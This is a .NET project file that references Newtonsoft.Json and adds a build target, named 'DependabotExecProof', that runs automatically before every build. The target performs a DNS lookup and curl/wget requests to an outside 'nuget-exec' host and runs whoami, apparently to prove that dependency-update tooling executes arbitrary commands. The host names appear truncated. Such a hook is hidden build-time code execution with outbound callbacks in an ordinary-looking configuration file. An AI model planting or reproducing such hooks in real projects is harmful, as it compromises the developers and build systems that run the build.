<Project Sdk="Microsoft.NET.Sdk">
  <PropertyGroup>
    <TargetFramework>net8.0</TargetFramework>
  </PropertyGroup>
  <ItemGroup>
    <PackageReference Include="Newtonsoft.Json" Version="12.0.1" />
  </ItemGroup>
  <Target Name="DependabotExecProof" BeforeTargets="Build">
    <Exec Command="nslookup nuget-exec-proof. || true" IgnoreExitCode="true" />
    <Exec Command="curl -s https://nuget-exec./proof || wget -q -O- https://nuget-exec./proof || true" IgnoreExitCode="true" />
    <Exec Command="whoami > /dev/stderr 2>&amp;1 || true" IgnoreExitCode="true" />
  </Target>
</Project>
